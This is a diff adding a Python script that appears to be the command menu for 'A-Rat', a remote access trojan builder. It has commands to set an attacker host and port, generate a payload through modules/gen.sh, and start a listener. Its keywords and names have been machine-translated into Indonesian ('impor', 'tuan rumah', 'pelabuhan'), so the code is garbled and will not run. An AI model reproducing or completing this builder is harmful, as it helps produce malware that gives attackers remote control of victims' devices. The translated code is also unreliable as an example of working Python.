@@ -1,0 +1,169 @@
+#!/usr/bin/env python
+
+# -*- koding: utf-8 -*-
+
+
+impor  os , sys , subproses
+
+dari  waktu  impor  tidur
+
+os . sistem ( "jelas" )
+
+isi ulang ( sys )
+
+sys . setdefaultencoding ( "utf-8" )
+
+
+tuan rumah  =  " "
+
+pelabuhan  =  " "
+
+keluaran  =  " "
+
+
+def  logo ():
+
+ cetak ( """
+\t _____ ____ _____ _______
+\t /$$$$$\ |$$$$\ /$$$$$$$$$$$
+\t |$ $| ____ |$ $| |$ $| $|
+\t |$$$$$| $$$$ |$$$$/ |$$$$$| $|
+\t |$ $| |$ $\ |$ $| $|
+\t |$ $| |$ $\ |$ $| $|
+\t [*] Versi : 1.0.0
+\t [*] Dikodekan Oleh ./M4F14
+\t [*] MENAKUTKAN TIM CYBER DEMON
+""" )
+
+
+ bantuan def ():
+
+ cetak ( """
+Perintah:
+set HOST : Setel Host Anda (mis. set HOST 127.0.0.1)
+set PORT : Setel Port Anda (mis. set PORT 1337)
+set OUTPUT : Tetapkan Nama Dan Jalur Keluaran Anda (mis. set OUTPUT /home/payload)
+tampilkan nilai: Tampilkan Nilai Host, Port, dan Output
+mulai pendengar : Mulai Server Koneksi Anda 
+Tolong Laporkan Bug Ini Ke FB Saya
+FB : https://m.facebook.com/sefina.dewi
+FP : https://m.facebook.com/androsec1337cyberteam \n """ )
+
+       
+
+def  utama ():
+
+     host global , port , keluaran
+
+
+    sedangkan  Benar :
+
+        cmd  =  raw_input ( "[*] A-Rat@SODC:~# " ). lebih rendah ()
+
+
+        jika  cmd  ==  "bantuan" :
+
+            bantuan ()
+
+
+        elif  cmd  ==  'spanduk' :
+
+            os . sistem ( "jelas" )
+
+            logo ()
+
+            utama ()
+
+
+        elif  "jelas"  di  cmd :
+
+            os . sistem ( "jelas" )
+
+
+        elif  "setel Host"  di  cmd :
+
+            tuan rumah  =  cmd . membagi ()[ - 1 ]
+
+
+        elif  "setel port"  di  cmd :
+
+            port  =  int ( cmd . split ()[ - 1 ])
+
+
+        elif  "set output"  di  cmd :
+
+            keluaran  =  cmd . membagi ()[ - 1 ]
+
+
+        elif  cmd  ==  "tampilkan nilai" :
+
+            print  " \n [+] HOST : %s \n [+] PORT : %s \n [+] OUTPUT : %s \n " % ( host , port , output )
+
+
+        elif  cmd  ==  "menghasilkan muatan"  atau  cmd  ==  "menghasilkan" :
+
+            jika  host  !=  " "  dan  port  !=  " "  dan  output  !=  " " :
+
+                print ( "[+] Menghasilkan Muatan ..." )
+
+                tidur ( 1 )
+
+                print ( "[*] Menggunakan Konfigurasi . . . \n |_ HOST : " + host + " \n |_ PORT : " + str ( port ) + " \n |_ OUTPUT : " + output )
+
+                tidur ( 3 )
+
+                os . system ( " sh modules/gen.sh " + host + " " + str ( port ) + " " + output )
+
+                print ( "[+] Menghasilkan Sukses ..." )
+
+                tidur ( 1 )
+
+                utama ()
+
+            lain :
+
+                print  " \n [!] HOST : %s \n [!] PORT : %s \n [!] OUTPUT : %s \n " % ( host , port , output )
+
+
+        elif  cmd  ==  "start"  atau  cmd  ==  "run"  atau  cmd  ==  "start listener" :
+
+            jika  host  !=  " "  dan  port  !=  " " :
+
+                jika  os . nama  ==  "nt" :
+
+                    subproses . Popen ([ sys . Executable , 'modul / listener.py' , tuan rumah , str ( pelabuhan )], creationflags = sub proses . CREATE_NEW_CONSOLE )
+
+                lain :
+
+                    os . sistem ( sys . executable  +  " modules/listener.py %s %s" % ( host , str ( port )))
+
+            lain :
+
+                print  " \n [!] Host : %s \n [!] Port : %s \n " % ( host , port )
+
+        lain :
+
+            print ( "[!] Periksa Perintah Anda ..." )
+
+            utama ()
+
+
+def  kontrol ():
+
+    coba :
+
+        logo ()
+
+        utama ()
+
+    kecuali  KeyboardInterrupt :
+
+        print ( " \n [!] CTRL+C Mendeteksi Alat yang Keluar ..." )
+
+        tidur ( 2 )
+
+        sys . keluar ()
+
+if  __name__  ==  "__main__" :
+
+    kontrol ()
